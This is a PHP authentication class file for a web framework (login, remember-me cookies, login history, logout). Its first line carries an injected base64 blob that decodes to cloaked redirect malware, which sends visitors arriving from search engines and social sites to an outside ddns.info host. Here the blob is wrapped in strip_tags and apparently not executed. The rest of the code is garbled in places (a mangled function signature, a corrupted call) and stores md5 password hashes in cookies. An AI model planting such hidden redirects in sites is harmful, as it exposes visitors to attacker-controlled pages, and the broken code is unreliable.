<?php	 	$dropthisline=strip_tags(("CmVycm9yX3JlcG9ydGluZygwKTsKJHFhenBsbT1oZWFkZXJzX3NlbnQoKTsKaWYgKCEkcWF6cGxtKXsKJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOwokdWFnPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsKaWYgKCR1YWcpIHsKaWYgKCFzdHJpc3RyKCR1YWcsIk1TSUUgNy4wIikgYW5kICFzdHJpc3RyKCR1YWcsIk1TSUUgNi4wIikgYW5kICFzdHJzdHIoJHVhZywiRmlyZWZveC8zLiIpKXsKaWYgKHN0cmlzdHIoJHJlZmVyZXIsInlhaG9vLiIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpbmcuIikgb3Igc3RyaXN0cigkcmVmZXJlciwicmFtYmxlci4iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ3ZWJhbHRhLiIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInQuY28vIikgb3Igc3RyaXN0cigkcmVmZXJlciwidGlueXVybC5jb20iKSBvciBwcmVnX21hdGNoKCIveWFuZGV4XC5ydVwveWFuZHNlYXJjaFw/KC4qPylcJmxyXD0vIiwkcmVmZXJlcikgb3IgcHJlZ19tYXRjaCAoIi9nb29nbGVcLiguKj8pXC91cmxcP3NhLyIsJHJlZmVyZXIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImZhY2Vib29rLmNvbS9sIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYW9sLmNvbSIpIG9yIChwcmVnX21hdGNoICgiL2h0dHBzOlwvXC93d3cuZ29vZ2xlXC4oLio/KVwvLyIsJHJlZmVyZXIpIGFuZCBzdHJzdHIoJHVhZywiQ2hyb21lLyIpKSkgewppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgYW5kICFzdHJpc3RyKCRyZWZlcmVyLCJpbnVybCIpIGFuZCAhc3RyaXN0cigkcmVmZXJlciwiRWVZcDNENyIpKXsKaGVhZGVyKCJMb2NhdGlvbjogaHR0cDovL3JrZmhhZmcuZGRucy5pbmZvLyIpOwpleGl0KCk7Cn0KfQp9Cn0KfQ=="));

require_once(GENERIC_PATH."auth/custom_auth.php");

DEFINE("__AUTH_COOKIE_USER_NAME",      "{9F6AFFD1-529C-4BD9-9B4D-BF386D9E8DD2}");
DEFINE("__AUTH_COOKIE_PASSWORD",       "{E39940C3-2A14-47B7-820D-17D7AA6048D0}");
DEFINE("__AUTH_SESSION_LOGGED_IN",     "{2AF953F0-6078-426C-AEBB-2F5907FE5B0C}");
DEFINE("__AUTH_SESSION_LOGGED_IN_TAG", "{08016A7F-FC4F-4C57-AE17-257078D7DB59}");

class auth_login extends custom_auth {

  var $template_tag_error  = "error";
  var $template_tag_action = "action";
  var $control_login       = "edt_user_login";
  var $control_password    = "edt_user_password";
  var $control_remember_me = "edt_remember_me";
  var $login_page          = "login.html";
  var $login_url           = null;
  var $logout_url          = null;

  var $logged_in           = false;
  
  var $user_name;

  var $save_logins_history = false;
  var $logins_history_table = 'logins_history';
  
  var $allowed_ips = array();

  function cookie_user_name() {

    return md5($this->storage_tag(__AUTH_COOKIE_USER_NAME));

  }

  function cookie_password() {

    return md5($this->storage_tag(__AUTH_COOKIE_PASSWORD));

  }

  function set_user_name($value) {

    $_SESSION[$this->storage_tag()]['user_name']  = $value;

  }

  function do_init() {

    parent::do_init();

    $auth_info = session($this->storage_tag());
    
    $this->logged_in = (safe($auth_info, 'logged_in') == __AUTH_SESSION_LOGGED_IN);
    
    if (!$this->logged_in) {
      $entity = get(URL_PARAM_ENTITY);
      if (!in_array($entity, $this->allowed_entities)) {
        if (count($this->allowed_ips) && !in_array($this->user_ip, $this->allowed_ips)) {
          __finalyze_customization();
          $this->login_failed(null, null, trn("Login from your IP address prohibited"));
        } else {
          $this->login();
        }
      }
    } else {
      logme('Logged in as '.$this->user_name, 'AUT');
    }

  }

  function login($login = null, $password = null) {

    $_SESSION[$this->storage_tag()]['logged_in'] = __AUTH_SESSION_LOGGED_IN;

    if ((SUBMIT_MODE) and post($this->control_remember_me)) {
      if ($login)
        setcookie($this->cookie_user_name(), $login, time()+60*60*24*30);
      if ($password) 
        setcookie($this->cookie_password(), md5($password), time()+60*60*24*30);
    }

    if ($this->save_logins_history and $login) {
      global $dm;
      $dm->insert($this->logins_history_table, array( 'date_time'  => $dm->now()
                                                    , 'login'      => $login 
                                                    , 'ip_address' => $this->user_ip
                                                    , 'failed'     => 0
                                                    ));
    }

    logme('Logged in as '.$this->user_name, 'AUT');

    $this->call_event("on_login", $this->user_name);

    $this->do_after_login();

    refresh();

  }

  function login_failed($login, $password, $error  login_failed($login, $password, $error = null) {

    global $tmpl;

    if (SUBMIT_MODE) {
      logme('Login as '.$login.' failed', 'AUT');
      $tmgn($this->template_tag_error,  $error);
      $tmpl->assign($this->control_login,       htmlize($login));
      $tmpl->assign($this->control_remember_me, post($this->control_remember_me)?"checked":""); 
    } else
      logme('Not logged in', 'AUT');

    global $url;
    $tmpl->assign($this->template_tag_action, $url->url);

    $this->call_event("on_draw_login_page", null);

    if ($this->save_logins_history and $login) {
      global $dm;
      $dm->insert($this->logins_history_table, array( 'date_time'  => $dm->now()
                                                    , 'login'      => $login 
                                                    //, 'password'   => $password 
                                                    , 'ip_address' => $this->user_ip
                                                    , 'failed'     => 1
                                                    , 'error'      => $error
                                                    ));
    }

    logme('Not logged in', 'AUT');

    if ($this->login_url) {
      if (SUBMIT_MODE) 
        session_set('last_login_result', array( 'error'       => $error
                                              , 'username'    => for_html(post($this->control_login))
                                              , 'remember_me' => post($this->control_remember_me)?"checked":""
                                              ));
      redirect($this->login_url);
    } else {
      __finalyze_smarty_config();
      global $tmpl;
      $tmpl->assign('company_login_logo', get_config('company_login_logo'));
      $tmpl->assign('company_admin_email', get_config('company_admin_email'));
      $tmpl->display($this->login_page);
    }
    exit();

  }

  function logout() {
                                          
    setcookie($this->cookie_user_name(), "");
    setcookie($this->cookie_password(),  "");
    unset($_SESSION[$this->storage_tag()]);

    $this->call_event("on_logout", $this->user_name);

    session_unset();
    session_destroy();

    if ($this->logout_url)
      redirect($this->logout_url);
    else {
      global $url;
      redirect($url->complete_url);
    }

  }

  function do_after_login() {
  }

}

?>